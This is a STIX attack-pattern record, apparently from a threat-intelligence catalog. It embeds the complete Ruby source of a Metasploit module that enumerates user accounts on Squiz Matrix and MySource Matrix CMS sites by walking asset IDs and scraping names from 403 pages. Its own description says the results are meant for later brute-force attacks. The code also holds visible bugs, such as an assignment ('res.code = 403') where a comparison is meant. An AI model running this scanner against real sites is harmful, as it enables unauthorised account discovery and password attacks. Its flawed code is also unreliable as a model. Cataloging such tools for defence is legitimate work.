{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e4570db-516b-4890-b8ea-e13e0d36faaf",
    "created": "2024-08-14T16:28:47.7196Z",
    "modified": "2024-08-14T16:28:47.719604Z",
    "name": "Squiz Matrix User Enumeration Scanner",
    "description": " This module attempts to enumerate remote users that exist within the Squiz Matrix and MySource Matrix CMS by sending GET requests for asset IDs e.g. ?a=14 and searching for a valid username eg \"~root\" or \"~test\" which is prefixed by a \"~\" in the response. It will also try to GET the users full name or description, or other information. You may wish to modify ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE. Information gathered may be used for later bruteforce attacks. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/squiz_matrix_user_enum.rb",
            "external_id": "squiz_matrix_user_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.osi.security/advisories.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::HttpClient\n\n  # Reporting facilities\n  include Msf::Auxiliary::Report\n\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Squiz Matrix User Enumeration Scanner',\n      'Description'    => %q{\n        This module attempts to enumerate remote users that exist within\n        the Squiz Matrix and MySource Matrix CMS by sending GET requests for asset IDs\n        e.g. ?a=14 and searching for a valid username eg \"~root\" or \"~test\" which\n        is prefixed by a \"~\" in the response. It will also try to GET the users\n        full name or description, or other information. You may wish to modify\n        ASSETBEGIN and ASSETEND values for greater results, or set VERBOSE.\n        Information gathered may be used for later bruteforce attacks.\n      },\n      'Author'         => [ 'Troy Rose <troy[at]osisecurity.com.au>', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://www.osi.security/advisories.html' ],\n        ],\n      'DisclosureDate' => '2011-11-08'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to users Squiz Matrix installation', '/']),\n        OptInt.new('ASSETBEGIN',  [ true, \"Asset ID to start at\", 1]),\n        OptInt.new('ASSETEND',  [ true, \"Asset ID to stop at\", 100]),\n      ])\n  end\n\n  def run_host(ip)\n    @users_found = {}\n\n    asset_begin = datastore['ASSETBEGIN']\n    asset_end = datastore['ASSETEND']\n    if (asset_begin > asset_end)\n      print_error(\"Unable to continue. ASSETEND must be greater than ASSETBEGIN\")\n    end\n\n    asset_begin.upto(asset_end) do |asset|\n      do_enum(asset)\n    end\n\n    if(@users_found.empty?)\n      print_status(\"#{full_uri} - No users found.\")\n    else\n      print_good(\"#{full_uri} - Users found: #{@users_found.keys.sort.join(\", \")}\")\n      report_note(\n      :host => rhost,\n      :port => rport,\n      :proto => 'tcp',\n      :sname => (ssl ? 'https' : 'http'),\n      :type => 'users',\n      :vhost => vhost,\n      :data => {:users =>  @users_found.keys.join(\", \")}\n    )\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_enum(asset)\n    begin\n      uri = normalize_uri(target_uri.path)\n\n      res = send_request_cgi({\n        'uri'     =>  \"#{uri}?a=#{asset}\",\n        'method'  => 'GET'\n      }, 20)\n\n      if (datastore['VERBOSE'])\n        if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\\w+)<\\/i>/)\n          print_status(\"#{full_uri}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'\")\n        else\n          print_status(\"#{full_uri}?a=#{asset} - Trying Asset: '#{asset}'\")\n        end\n      end\n\n      if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>~(\\w+)<\\/i>/)\n        user=$1.strip\n\n        # try the full name of the user\n        tmpasset = asset - 1\n        res = send_request_cgi({\n          'uri'     =>  \"#{uri}?a=#{tmpasset}\",\n          'method'  => 'GET'\n        }, 20)\n        if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\\/i>/)\n          tmpasset = asset - 2\n          res = send_request_cgi({\n            'uri'     =>  \"#{uri}?a=#{tmpasset}\",\n            'method'  => 'GET'\n          }, 20)\n          print_good(\"#{full_uri}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'\")\n          if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\\/i>/)\n            fullname = $1.strip\n            print_good(\"#{full_uri}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})\")\n            @users_found[\"#{user} (#{fullname})\"] = :reported\n          end\n        else\n          print_good(\"#{full_uri} - Squiz Matrix User: '#{user}'\")\n          @users_found[user] = :reported\n        end\n\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: (ssl ? 'https' : 'http'),\n          proof: \"WEBAPP=\\\"Squiz Matrix\\\", VHOST=#{vhost}\"\n        )\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-08"
}